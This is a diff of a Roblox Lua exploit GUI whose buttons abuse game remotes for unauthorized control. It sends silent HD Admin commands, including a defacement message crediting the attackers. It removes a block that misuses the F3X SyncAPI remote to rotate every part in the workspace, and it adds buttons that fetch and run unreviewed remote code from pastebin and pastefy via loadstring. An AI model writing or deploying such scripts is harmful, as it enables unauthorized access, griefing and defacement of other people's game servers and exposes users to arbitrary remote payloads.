@@ -1986,7 +1986,7 @@ TextButton16_15.MouseButton1Click:Connect(function()
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
 
-RequestCommand:InvokeServer(";h D3EZZTROYED BYY H4RKZ&WHITE2SP*OKY
+RequestCommand:InvokeServer(";h D3EZZTROYED BYY H4RKZ&WHITE2SP*OKY")
 end)
 
 local TextButton16_16 = Instance.new('TextButton')
@@ -2084,7 +2084,7 @@ TextButton11.MouseButton1Click:Connect(function()
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
 
-RequestCommand:InvokeServer(";music time 14")
+RequestCommand:InvokeServer(";time 14")
 end)
 
 local TextButton16_17 = Instance.new('TextButton')
@@ -2156,7 +2156,7 @@ TextButton14.Font = Enum.Font.Code
 TextButton14.TextXAlignment = Enum.TextXAlignment.Center
 TextButton14.TextYAlignment = Enum.TextYAlignment.Center
 TextButton14.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/Md8U5MAW"))()
+    		loadstring(game:HttpGet("https://pastebin.com/raw/Md8U5MAW"))()
 end)
 
 local TextButton16_18 = Instance.new('TextButton')
@@ -2251,43 +2251,7 @@ TextButton16_21.Font = Enum.Font.Code
 TextButton16_21.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_21.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_21.MouseButton1Click:Connect(function()
-    local player = game.Players.LocalPlayer
-local tool
-for _,v in pairs(player:GetDescendants()) do
-	if v.Name == "SyncAPI" then		tool = v.Parent
-	end
-end
-for _,v in pairs(game.ReplicatedStorage:GetDescendants()) do
-	if v.Name == "SyncAPI" then
-		tool = v.Parent
-	end
-end
-if not tool then return end
-local remote = tool.SyncAPI.ServerEndpoint
-local function MovePart(part,cf)
-	remote:InvokeServer(
-		"SyncMove",
-
-		{
-			{
-				Part = part,
-
-				CFrame = cf
-
-			}
-		}
-	)
-end
-for _,part in ipairs(workspace:GetDescendants()) do
-	if part:IsA("BasePart") then
-		spawn(function()
-			local cf = part.CFrame * CFrame.Angles(0,0,math.rad(30))
-			pcall(function()
-				MovePart(part,cf)
-			end)
-		end)
-	end
-end
+    loadstring(game:HttpGet("https://pastefy.app/r2Q3XIlj/raw"))()
 end)
 
 local UIDragDetector = Instance.new('UIDragDetector')
